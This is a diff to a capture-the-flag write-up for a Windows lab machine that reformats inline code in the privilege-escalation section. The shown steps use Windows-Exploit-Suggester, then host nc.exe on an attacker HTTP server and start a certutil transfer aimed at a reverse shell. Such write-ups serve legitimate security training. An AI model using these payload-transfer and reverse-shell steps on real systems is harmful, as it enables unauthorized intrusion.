@@ -36,7 +36,7 @@ a %00 sequence in a search action, and the exploit abuses it </br>
 <img src="images/optimum/initial_shell_poc2.png" alt="initial_shell_poc2" width="650" height="120"/> </br> </br>
 <!--Privilege Escalation:-->
 # Privilege Escalation:
-I used [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), and copied all of the system information with the Command: ```bash systeminfo ``` , saved it into a file on my Kali, and ran the script with the command:
+I used [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), and copied all of the system information with the Command: ```systeminfo```, saved it into a file on my Kali, and ran the script with the command:
 ```bash
 python2 windows-exploit-suggester.py --database 2022-07-17-mssb.xls
 --systeminfo /home/kali/Downloads/boxes/optimum/sysinfo.txt
@@ -46,8 +46,8 @@ I found out that this machine was vulnerable to MS16-098: </br>
 **MS16-098:** </br>
 The exploit didn't work and my powershell session got stuck, So i tried using netcat, to send myself a proper CMD shell:
 **Kali Linux:** </br>
-1. I Copied the nc.exe binary to my working directory: ```bash cp /usr/share/windows-binaries/nc.exe . ```
-2. I Hosted a python http server with: ```bash python -m http.server 80```
+1. I Copied the nc.exe binary to my working directory: ```cp /usr/share/windows-binaries/nc.exe . ```
+2. I Hosted a python http server with: ```python -m http.server 80```
 **Windows Target Machine:** </br>
 I used certutil to transfer the file from my Kali to the Windows machine:
 ```bash
